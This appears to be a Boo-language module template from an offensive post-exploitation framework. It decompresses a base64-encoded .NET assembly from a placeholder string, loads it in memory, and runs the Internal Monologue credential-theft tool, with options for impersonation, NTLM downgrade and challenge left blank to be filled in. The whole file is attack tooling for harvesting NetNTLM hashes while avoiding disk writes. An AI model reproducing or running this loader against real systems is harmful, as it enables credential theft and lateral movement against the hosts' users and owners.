import System
import System.IO
import System.IO.Compression
import System.Text
import System.Reflection 

public static def Decompress(compressed as (byte)) as (byte):
    using inputStream = MemoryStream(compressed.Length):
        inputStream.Write(compressed, 0, compressed.Length)
        inputStream.Seek(0, SeekOrigin.Begin)
        using outputStream = MemoryStream():
            using deflateStream = DeflateStream(inputStream, CompressionMode.Decompress):
                buffer = Array.CreateInstance(Byte, 4096)
                bytesRead = deflateStream.Read(buffer, 0, buffer.Length)
                outputStream.Write(buffer, 0, bytesRead)
                while bytesRead != 0:
                    bytesRead = deflateStream.Read(buffer, 0, buffer.Length)
                    outputStream.Write(buffer, 0, bytesRead)

                return outputStream.ToArray()

public static def Main():
    InternalMonologueDLL = "INTERNAL_MONOLOGUE_DLL"
    assembly = Assembly.Load(Decompress(Convert.FromBase64String(InternalMonologueDLL)))
    InternalMonologue as duck = assembly.GetType("InternalMonologue.Class1")
    InternalMonologue.Main(impersonate=,
        threads=,
        downgrade=,
        restore=,
        challenge=,
        verbose=)
